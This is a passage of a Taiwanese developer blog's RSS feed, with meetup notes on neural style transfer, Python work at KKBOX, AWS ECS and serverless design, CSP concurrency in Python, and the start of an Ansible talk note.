&lt;li&gt;Neural Networks - 模擬人腦的神經元  &lt;ul&gt;
&lt;li&gt;Sigmoid  &lt;/li&gt;
&lt;li&gt;Rectified Linear  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Convolutional Neural Networks - 處理影像上很常用  &lt;ul&gt;
&lt;li&gt;Convolutional Layer  &lt;/li&gt;
&lt;li&gt;Pooling Layer - 把重要的訊息保留下來，不重要的丟掉。  &lt;ul&gt;
&lt;li&gt;Maximum Pooling  &lt;/li&gt;
&lt;li&gt;Average Pooling  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Architecture  &lt;ul&gt;
&lt;li&gt;Input Layer  &lt;/li&gt;
&lt;li&gt;Convolutional Layer  &lt;/li&gt;
&lt;li&gt;Pooling Layer  &lt;/li&gt;
&lt;li&gt;Convolutional Layer  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://arxiv.org/pdf/1409.1556.pdf"&gt;VGG19&lt;/a&gt; - 可以模擬人腦看東西的過程  &lt;ul&gt;
&lt;li&gt;What is VGG19?  &lt;ul&gt;
&lt;li&gt;VGG Net-E (19 layers)  &lt;/li&gt;
&lt;li&gt;Pre-trained model  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;如何產生畫作  &lt;ul&gt;
&lt;li&gt;Content Generation  &lt;ul&gt;
&lt;li&gt;比較景物跟現在的畫布有何不同  &lt;/li&gt;
&lt;li&gt;Backward Propagation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Style Generation  &lt;ul&gt;
&lt;li&gt;Style 是比較抽象的概念  &lt;/li&gt;
&lt;li&gt;在這裡被當成是一種特徵，而且是跟位置無關的特徵。  &lt;/li&gt;
&lt;li&gt;Style Extraction  &lt;ul&gt;
&lt;li&gt;同一幅畫的的不同位置，轉換出來的風格會是一樣的。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Gramian_matrix"&gt;Gram Matrix&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;把位置的訊息拿掉後，讓 Canvas （畫布）的風格愈來愈接近目標畫作  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Artwork Generation  &lt;ul&gt;
&lt;li&gt;把景物跟風格都一起丟進 VGG19 後，再把兩個一起做最佳化。  &lt;ul&gt;
&lt;li&gt;Layer_total == (alpha)&lt;em&gt;Layer_content + (beta)&lt;/em&gt;Layer_style  &lt;ul&gt;
&lt;li&gt;alpha 的比重愈高，畫作愈寫實。  &lt;/li&gt;
&lt;li&gt;beta 的比重愈高，愈接近畫作。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/ckmarkohchang/neural-doodle"&gt;Neural Doodle&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;改良 Neural Art 的缺點  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://arxiv.org/abs/1601.04589"&gt;http://arxiv.org/abs/1601.04589&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Neural Art 採用 gram-based matrix 取得風格，因為忽略位置訊息，所以所有的部份風格都是相同的。  &lt;/li&gt;
&lt;li&gt;Neural Doodle 則採用了不會忽略位置訊息的 Patch-based Matrix，會尋找畫作中與畫布相近的部份取得該部份的風格，因此改善了 Neural Art 的缺點。  &lt;/li&gt;
&lt;li&gt;Patch-Based Style Transfer  &lt;ul&gt;
&lt;li&gt;透過兩向量內積除以兩向量絕對值來判斷相近的程度，然後自動去尋找最相近的 patch，得到 Most simillar patch  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Sematic Style Transfer  &lt;ul&gt;
&lt;li&gt;可以為每個部份加上標籤  &lt;/li&gt;
&lt;li&gt;可以比 Patch-based 產生更精準的畫作  &lt;/li&gt;
&lt;li&gt;可以用小畫家上色，也可以使用 Pixel Labeling  &lt;/li&gt;
&lt;li&gt;Canvas 不經過 VGG19 而是透過 Average Pooling 再把 Canvas 和 Style 相加  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Image Analogy  &lt;ul&gt;
&lt;li&gt;直接用畫作產生 Semantic Map，然後再修改該 Sematic Map，再使用修改過後的 Semantic Map 生成新的畫作。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Experience from KKBOX&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;PyKKBOX  &lt;ul&gt;
&lt;li&gt;2011 initiate, private repo.  &lt;/li&gt;
&lt;li&gt;iOS team  &lt;/li&gt;
&lt;li&gt;KKBOX 一起聽  &lt;ul&gt;
&lt;li&gt;Challenges  &lt;ul&gt;
&lt;li&gt;iOS (client) co-works with Windows (broadcaster) only.  &lt;/li&gt;
&lt;li&gt;In 3 months, the API's verion changed 5 times.  &lt;/li&gt;
&lt;li&gt;There is even no broadcasters to listen to.  &lt;/li&gt;
&lt;li&gt;In academia, we may call this "ill-posed (optimization) problem".  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;A bot for poc  &lt;ul&gt;
&lt;li&gt;主管要求在沒有 broadcaster 的情況下 demo iOS client 的功能，只好用 Python 接 API 快速刻一個偽 broadcaster 出來。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;因為 iOS team 的不熟 Python，不打算教 venv 那類的東西，所以只用到 built-in modules 跟 PyObject，code 直接 clone 下來就能跑了，完全不用 third-party packages。  &lt;/li&gt;
&lt;li&gt;用 Python 可以快速的建出 PoC，協助開發。  &lt;/li&gt;
&lt;li&gt;2013 就停止開發了。停止原因是沒有進一步的計劃和需求，而且畢竟是個 iOS team。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/imsardine/pyuia"&gt;PyUIA&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Started in 2013.  &lt;/li&gt;
&lt;li&gt;Testing for Playlist Auto-Sync  &lt;/li&gt;
&lt;li&gt;想做到讓 unittestings 可以儘量不需要額外寫程式碼，讓不會寫程式的 QA 可以用特定格式的 natural language 就可以新增測試。  &lt;ul&gt;
&lt;li&gt;（我記得 robotframework 好像也可以辦到這件事？）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Video Encoding System  &lt;ul&gt;
&lt;li&gt;Challenges  &lt;ul&gt;
&lt;li&gt;Given a thousands of videos  &lt;/li&gt;
&lt;li&gt;Given ~150 videos per day  &lt;/li&gt;
&lt;li&gt;Given a scalable number of encoders on EC2 instances  &lt;/li&gt;
&lt;li&gt;Assuming the workflow for each video can be different  &lt;ul&gt;
&lt;li&gt;根據每個客戶有不同的限制和需求  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How to make a robust system to handle this challenge in consideration of  &lt;ul&gt;
&lt;li&gt;Just 1.5 developer(s)  &lt;/li&gt;
&lt;li&gt;everything can be broken  &lt;/li&gt;
&lt;li&gt;computing resource is expensive (AWS)  &lt;/li&gt;
&lt;li&gt;AWS is weak  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用 tcl 寫 Job Script，使用 Producter-Consumer model  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/KKBOX/mass"&gt;Mass&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;最大的挑戰是一天要轉三千部影片  &lt;ul&gt;
&lt;li&gt;最後成功了，但一天內用 AWS 燒掉了十幾萬還是幾十萬台幣，忘了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RDC Toolbox  &lt;/li&gt;
&lt;li&gt;Python 是個方便且讓人寫起來感到快樂的語言，歡迎大家一起開心地寫 Python。  &lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Fri, 22 Apr 2016 00:15:00 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-04-21:posts/2016/04/21/taipei-py-20160421-meetup-note/</guid><category>Python</category><category>Taipei.py</category><category>Neural Network</category><category>KKBOX</category><category>Meetup</category></item><item><title>AWSUGTW Meetup 10th Note</title><link>https://blog.m157q.tw/posts/2016/04/19/awsugtw-meetup-10th-note/</link><description>&lt;p&gt;&lt;a href="http://awsugtw.kktix.cc/events/10-tpe"&gt;http://awsugtw.kktix.cc/events/10-tpe&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Best practices for AWS ECS and Serverless&lt;/h1&gt;
&lt;h2&gt;Speaker: Pahud&lt;/h2&gt;
&lt;h3&gt;AWS EC2 Container Service (ECS)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;ECS Cluster  &lt;ul&gt;
&lt;li&gt;ASG (Auto Scaling Group)  &lt;ul&gt;
&lt;li&gt;on-demand  &lt;/li&gt;
&lt;li&gt;spot instance (85% off compare to on demand ASG)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CloudWatch  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Auto Scaling Policy Design  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;30%-60%&lt;/code&gt;: scale out spot  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;= 60%&lt;/code&gt;: scale out on-demand  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;below 30%&lt;/code&gt;: scale in spot  &lt;/li&gt;
&lt;li&gt;Simple tip  &lt;ul&gt;
&lt;li&gt;on-demand 打底，spot 伸縮。  &lt;/li&gt;
&lt;li&gt;spot fleet if you need couples of instances (for RTB)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://aws.amazon.com/sqs/"&gt;SQS (Job queue)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://aws.amazon.com/elasticloadbalancing/"&gt;internal / external ELB&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.aws.amazon.com/AmazonCloudWatch/latest/DeveloperGuide/QuickStartEC2Instance.html"&gt;CloudWatch Logs Agent&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Chat Ops  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://aws.amazon.com/ecr/"&gt;ECR - EC2 Container Registry&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a href="http://www.slideshare.net/JulienSIMON5/amazon-ecs-january-2016/12"&gt;Load Balancing on Random Ports&lt;/a&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Meteor Galaxy  &lt;ul&gt;
&lt;li&gt;session-aware with random ports  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Is there a way to move code in cloud native way?&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;"No server is easier to manage than no server."  &lt;/li&gt;
&lt;li&gt;Event-driven Cloud Computing  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.aws.amazon.com/lambda/latest/dg/welcome.html"&gt;AWS Lambda&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://aws.amazon.com/api-gateway/"&gt;AWS API Gateway&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://aws.amazon.com/kinesis/streams/"&gt;Amazon Kinesis&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;persistent  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://aws.amazon.com/dynamodb/"&gt;DynamoDB&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;可以搭配 AWS Lambda 使用，幫忙 Archive  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://aws.amazon.com/cloudtrail/"&gt;AWS CloudTrail&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://aws.amazon.com/sns/"&gt;AWS SNS&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Mobile Integration&lt;/h3&gt;
&lt;p&gt;手機安裝 SDK，可以直接使用 AWS Lambda&lt;br /&gt;
支援 RequestResponse(Sync), Event(Async)&lt;br /&gt;
可以直接丟 json payload  &lt;/p&gt;
&lt;p&gt;如果不要直接跟 AWS Lambda 互動的話&lt;br /&gt;
可以透過 API Gateway 使用 HTTPS RESTful API  &lt;/p&gt;
&lt;p&gt;可以使用 Service Proxy Integration&lt;br /&gt;
透過 IAM assume role 去達成  &lt;/p&gt;
&lt;h3&gt;API Gateway Call Flow&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;User =&amp;gt;  
Internet =&amp;gt;  
Amazon CloudFront (保證最佳 routing) =&amp;gt;  
API Gateway =&amp;gt; API Gateway Cache  
            =&amp;gt; Amazon CloudWatch Monitoring  
            =&amp;gt; Endpoints on Amazon EC2  
            =&amp;gt; Any other accessible pubilc data.  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Pros and Cons&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Pros  &lt;ul&gt;
&lt;li&gt;cloud native with you business code in AWS Lambda  &lt;/li&gt;
&lt;li&gt;不需要維護 infra  &lt;/li&gt;
&lt;li&gt;leverage AWS PaaS infrastructure at scale  &lt;/li&gt;
&lt;li&gt;custom or federated authorization  &lt;ul&gt;
&lt;li&gt;接到 request 後，可以先丟到某個 AWS Lambda 作 Authorization 當作 Authorization module  &lt;/li&gt;
&lt;li&gt;或是 AWS Lamdba 轉到預先寫好的或已經存在的認証系統請求 Authorization  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;very minimal cost for small-medium teams  &lt;ul&gt;
&lt;li&gt;AWS Lambda: 30M requests $11.53  &lt;/li&gt;
&lt;li&gt;AWS API Gateway: 1M requests $4.23  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/CaseyLee2/serverless-delivery"&gt;http://www.slideshare.net/CaseyLee2/serverless-delivery&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cons - Lambda Limit  &lt;ul&gt;
&lt;li&gt;Lambda soft limit concurrency is 100  &lt;ul&gt;
&lt;li&gt;調高的話必須要申請，預設是只有 100，為了防止你不小心寫錯程式導致帳單爆表 (?)  &lt;/li&gt;
&lt;li&gt;300 seconds max duration per invocation  &lt;/li&gt;
&lt;li&gt;Lambda in VPC restriction  &lt;ul&gt;
&lt;li&gt;Private IP addresses  &lt;/li&gt;
&lt;li&gt;ENIC limit (default 20*5 == 100)  &lt;ul&gt;
&lt;li&gt;會用掉一張虛擬網卡  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cons - API Gateway is Expensive  &lt;ul&gt;
&lt;li&gt;500-1000 QPS per AWS Account  &lt;/li&gt;
&lt;li&gt;5M requests/month == $18.79  &lt;/li&gt;
&lt;li&gt;100 QPS == $974.07/month == 31,350 NTD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cons - Performance  &lt;ul&gt;
&lt;li&gt;push and pull invocation model of Lambda  &lt;/li&gt;
&lt;li&gt;-&amp;gt; delegation with higher memory  &lt;ul&gt;
&lt;li&gt;用一個專門的 AWS Lambda，只從 stream 抓東西出來，丟給別的 AWS Lambda 做邏輯處理。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;No connection pooling  &lt;ul&gt;
&lt;li&gt;Container 只有在第一次啟動的時候會 loading 最一開始初始化的部份  &lt;/li&gt;
&lt;li&gt;之後被 reuse 的時候會直接進 handler  &lt;/li&gt;
&lt;li&gt;所以不要把 conneciton 放在 code 一開始的部份，否則很可能會常常看到 conneciton 沒有正常 close，造成 TCP overhead.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cons - Development  &lt;ul&gt;
&lt;li&gt;CloudWatch debugging is slow.  &lt;/li&gt;
&lt;li&gt;Immature CI/CD toolchains  &lt;/li&gt;
&lt;li&gt;lack of PHP, Ruby and Golang  &lt;/li&gt;
&lt;li&gt;re-deploy the whole bundle could be a pain.  &lt;ul&gt;
&lt;li&gt;萬一 bundle 的大小超過 20~30 MB 的話有個解法  &lt;ul&gt;
&lt;li&gt;把 bundle 丟到 S3 裡面後，寫支 AWS Lamdba 幫你把這包 bundle 丟到另外一個 AWS Lambda 做處理  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;When should I use ECS and when for Serverless?&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;When to use ECS  &lt;ul&gt;
&lt;li&gt;Financial concern - When you have traffic more than 100+ QPS  &lt;/li&gt;
&lt;li&gt;Operation concern - Long running process or API service  &lt;/li&gt;
&lt;li&gt;Language concern - Golang, PHP, Ruby, etc.  &lt;/li&gt;
&lt;li&gt;Performance concern  &lt;/li&gt;
&lt;li&gt;Protocol concern  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;When to use Serverless  &lt;ul&gt;
&lt;li&gt;Small project, simple business logic  &lt;/li&gt;
&lt;li&gt;focus on the code only  &lt;/li&gt;
&lt;li&gt;no infra management  &lt;/li&gt;
&lt;li&gt;stateless  &lt;/li&gt;
&lt;li&gt;quick micro services implementation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Conclusions&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;儘可能把服務 container 化  &lt;/li&gt;
&lt;li&gt;Build stateless application  &lt;/li&gt;
&lt;li&gt;Immutable architecture  &lt;ul&gt;
&lt;li&gt;every computing conponent can be replaced and scaled with no impact  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Focus on your business logic, instead of the infra, forget your infra  &lt;/li&gt;
&lt;li&gt;Try not use any EC2, if necessary, avoid SSH into EC2 for manual operation.  &lt;ul&gt;
&lt;li&gt;不要想要救任何一台機器，應該要儘可能做到 stateless，只要壞掉就抽換掉。  &lt;/li&gt;
&lt;li&gt;抱著這樣的想法，比較能夠設計出夠彈性化的架構。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Fully-managed and fully-automation is the way to go.  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Interview Quiz w/o Servers&lt;/h1&gt;
&lt;h2&gt;Speaker: Cliff Lu&lt;/h2&gt;
&lt;h3&gt;用 AWS 架設低成本的面試系統&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Interview Automation  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.bnext.com.tw/ext_rss/view/id/1099271"&gt;超過 90 秒的都要自動化！&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;考量  &lt;ul&gt;
&lt;li&gt;效能  &lt;/li&gt;
&lt;li&gt;管理  &lt;/li&gt;
&lt;li&gt;費用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;AWS API Gateway + Lambda + S3  &lt;/li&gt;
&lt;li&gt;AWS Lambda  &lt;ul&gt;
&lt;li&gt;Serverless computing service  &lt;ul&gt;
&lt;li&gt;Support Python, Node.js, Java  &lt;ul&gt;
&lt;li&gt;Python 在上面沒有 share memory 可用，所以 multiprocess library 無效，得用 os.fork。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Managed, AWS 負責 HA and Scalability  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/tmp&lt;/code&gt; 有 512MB 可用  &lt;/li&gt;
&lt;li&gt;若 24/7 運行 (128MB)，費用與 t2.nano 差不多  &lt;/li&gt;
&lt;li&gt;觸發與權限設置詳見文件  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;AWS API Gateway  &lt;ul&gt;
&lt;li&gt;Managed HTTPS API Gateway  &lt;/li&gt;
&lt;li&gt;權限設計頗複雜，說明文件寫的蠻糟的，必須詳讀文件。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;心得&lt;/h1&gt;
&lt;p&gt;第一次參加 AWS 的聚會，也算是第一次認真接觸 AWS 啦。&lt;br /&gt;
畢竟之前也就只有在參加 Conf 還有一些閒聊的時候聽到些名詞。&lt;br /&gt;
只有懵懵懂懂的瞭解，印象最深的就是 AWS 有一堆自創的 service name，讓我不是很喜歡。&lt;br /&gt;
雖然公司目前都在用 GCP ，但還是會想瞭解一下 AWS 的內容。&lt;br /&gt;
希望之後對 GCP 和 AWS 都足夠瞭解之後，&lt;br /&gt;
可以有辦法自己歸納瞭解 GCP 和 AWS 之間的優缺點，&lt;br /&gt;
無論是在 Performance, Scalability, Pricing, Flexibility 等等。&lt;br /&gt;
畢竟如果要朝 Architect 走的話我想這是不可少的。&lt;br /&gt;
如果能力足夠的話可能還會再看看 Azure 吧。&lt;br /&gt;
不過目前看來應該還是會以 GCP 為主&lt;br /&gt;
希望之後研究夠深入的話可以有機會成為 GCP 相關 Library 的 contributor，&lt;br /&gt;
只是當個 User 的話實在是有點無趣。  &lt;/p&gt;
&lt;p&gt;話說 AWSUGTW 感覺蠻用心在經營的，&lt;br /&gt;
挑的 CLBC 夠寬敞（跟我常去 Taipei.py 用的那個 CLBC 差好多 QQ），&lt;br /&gt;
備有額外的茶點，而且免場地費。（真好奇錢從哪來的 XD)&lt;br /&gt;
還會請參加者填寫問卷收集回饋意見。&lt;br /&gt;
跟我最近參加過的 Taipei.py 跟 GCPUGTW 比起來算是比較會讓新加入者比較想繼續來的那種。&lt;br /&gt;
（而且女生好多，Taipei.py 只有一點點，GCPUGTW 完全沒有 XDDD）&lt;br /&gt;
不過沒啥人問問題，讓我不知道參加者到底是有沒有聽懂，&lt;br /&gt;
不過會後感覺蠻多人私底下去找講者討論的，應該只是不想或不敢當面問吧？&lt;br /&gt;
然後沒看到平常跑社群的熟面孔，&lt;br /&gt;
果然不同的 User Group 就是不同的生態圈啊。  &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Wed, 20 Apr 2016 00:03:00 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-04-19:posts/2016/04/19/awsugtw-meetup-10th-note/</guid><category>AWS</category><category>AWSUGTW</category><category>EC2</category><category>Serverless</category><category>Meetup</category></item><item><title>Taipei.py 20160331 Meetup Note</title><link>https://blog.m157q.tw/posts/2016/04/01/taipei-py-20160331-meetup-note/</link><description>&lt;p&gt;&lt;a href="https://www.meetup.com/Taipei-py/events/229246749"&gt;https://www.meetup.com/Taipei-py/events/229246749&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Topic 1: Skyfield  &lt;/li&gt;
&lt;li&gt;Topic 2: Uncomplicated Concurrency in Python  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Tutorial about skyfield&lt;/h1&gt;
&lt;h2&gt;David Mikolas (david.mikolas@gmail.com)&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://tw.pycon.org/2015apac/en/program/72"&gt;https://tw.pycon.org/2015apac/en/program/72&lt;/a&gt;&lt;br /&gt;
&lt;a href="http://davidmikolas.blogspot.tw/"&gt;http://davidmikolas.blogspot.tw/&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;astropy - clothes  &lt;/li&gt;
&lt;li&gt;AstroPython  &lt;/li&gt;
&lt;li&gt;AstroBetter  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.blender.org/"&gt;Blender&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=vW93wkDqz54"&gt;https://www.youtube.com/watch?v=vW93wkDqz54&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Alfonsine_tables"&gt;Alfonsine tables&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Ephemeris"&gt;星歷表&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://ssd.jpl.nasa.gov/?ephemerides"&gt;http://ssd.jpl.nasa.gov/?ephemerides&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Julian_day"&gt;Julian Date&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Uncomplicated Concurrency in Python&lt;/h1&gt;
&lt;h2&gt;Mosky Liu&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;It will introduce how to implement the CSP (Communicating Sequential Processes) in Python with common libraries.  &lt;/p&gt;
&lt;p&gt;CSP（communicating sequential processes）是一個著名的並行系統（concurrent systems）數學理論 [1]，並獲得 Go lang 採用作為其並行設計的基礎 [2]。其優點是相較於傳統的多執行緒設計來說較為簡單 [3]，依此理論可以設計出更好維護的並行程式。  &lt;/p&gt;
&lt;p&gt;雖然 Python 並沒有特別將 CSP 設計成語言的一部份，但我們仍可以利用常見函數庫內的工具實現 CSP，寫出更好維護的並行程式。講者將介紹各種利用 Python 常見函數庫，包含 event-driven、multithreading、multiprocessing 層級，實現 CSP 的方法。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Ctrl-C =&amp;gt; SIGINT&lt;br /&gt;
Ctrl-C in Python =&amp;gt; KeyboardInterrupt  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Channel-based Multithreading  &lt;/li&gt;
&lt;li&gt;With the channel  &lt;ul&gt;
&lt;li&gt;Channel 讓 Multi-Threading in Python 變得比較好寫  &lt;ul&gt;
&lt;li&gt;讓程式裏面只會有 Queue, 不需要費心去處理 join, lock 的問題，只要小心一下 Ctrl-C  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Producer-Consumer Pattern  &lt;/li&gt;
&lt;li&gt;SOA (Service-oriented Architecture)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CSP actually is  &lt;ul&gt;
&lt;li&gt;a formal language  &lt;ul&gt;
&lt;li&gt;describing patterns of interaction in concurrent systems  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;mathematical theories  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Process_calculus"&gt;process calculi&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h1&gt;Lightning Talk&lt;/h1&gt;
&lt;h2&gt;Vectorizing String Operation&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://www.pha8.com/demo.html"&gt;http://www.pha8.com/demo.html&lt;/a&gt;  &lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Fri, 01 Apr 2016 09:54:54 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2016-04-01:posts/2016/04/01/taipei-py-20160331-meetup-note/</guid><category>Python</category><category>Taipei.py</category><category>skyfield</category><category>astronomy</category><category>concurrency</category><category>Meetup</category></item><item><title>2015 12 月份 SA@Tainan 淺談 Ansible 自動化組態管理工具之筆記</title><link>https://blog.m157q.tw/posts/2015/12/26/study-area-ansible-tutorial-note/</link><description>&lt;ul&gt;
&lt;li&gt;Speaker  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/sakanamax"&gt;黃俊宏 sakana / Max&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Event URL  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://phorum.study-area.org/index.php/topic,71531.msg343054.html#msg343054"&gt;2015 12月份 SA@Tainan 淺談 Ansible 自動化組態管理工具 12/26(六)&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
